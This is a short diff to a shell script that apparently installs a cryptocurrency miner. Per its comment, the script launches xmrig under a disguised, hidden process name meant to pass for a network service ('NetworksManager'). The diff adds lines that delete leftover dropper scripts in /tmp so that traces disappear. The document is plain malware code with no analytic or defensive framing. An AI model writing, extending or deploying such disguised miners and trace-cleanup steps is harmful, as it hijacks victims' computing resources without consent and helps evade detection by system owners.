@@ -9,6 +9,7 @@ if [[ $(ps -ef | grep NetworksManager | grep -v grep | wc -l) != 0 ]]; then
     # if not already runing, launch xmrig with nohup
     echo "running proccess"
 	rm -r /tmp/w.sh
+	rm -r /tmp/*.sh.*
     exit
 fi
 
@@ -94,6 +95,7 @@ if [ $launch = 1 ]; then
     #nohup ./NetworksManager > out.log 2>&1 &
 	nohup ./.Service-Networks -s "NetworksManager" ./.NetworksManager > .out.log 2>&1 &
 	rm -r /tmp/w.sh
+	rm -r /tmp/*.sh.*
 fi
 
 echo "all done"
